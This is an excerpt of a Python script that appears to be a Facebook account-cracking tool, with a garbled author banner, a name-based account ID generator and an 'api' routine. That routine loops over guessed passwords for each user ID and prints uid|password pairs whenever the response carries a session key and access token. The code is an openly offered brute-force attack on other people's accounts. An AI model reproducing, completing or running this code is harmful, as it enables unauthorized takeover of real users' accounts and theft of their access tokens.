...
|__/  |__/ \______/ |__/     |__/      |__/    |__/     \______/  \______/ 
    ...
    鈹� [鉁揮 AUTHOR   : MD Humayun Kobir            鈹�
    鈹� [鉁揮 GITHUB   : HUM4YU9         鈹�
    鈹� [鉁揮 WHATSAPP : 01880480527        鈹�
    鈹� [鉁揮 POWER BY : \x1b[1;32mSITZHUM4YU9\x1b[1;97m            鈹�
    鈹斺攢鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹榎033[1;92m""")
		...
		print("\033[92;1m        AUTHOR : HUM4YU9      ")
		print("\033[97;1m   鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€鈹€")
		...
		if hoga in ["", " "]:
			...
			os.system('am start https://www.facebook.com/HUMAYUN.KOBIR.OFFICIAL.04')
		else:
			Main()
	...
	def email(self):
		x = 111
		xx = 999
		nam = input("%s [?] TYPE A NAME %s(EX:fahim ", " HUM4YU9): "%(Y,G))
		nam = nam.replace(" ", "")
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s\033[0;93m[HUM4YU9馃う鈥嶁檪锔廬 : \033[0;97m %s/%s -> \033[0;92m [OK馃槏:%s ]- \033[0;93m[CP馃樋:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[HUM4YU9-OK馃槏] %s|%s\033[0;97m         "%(uid, pw))
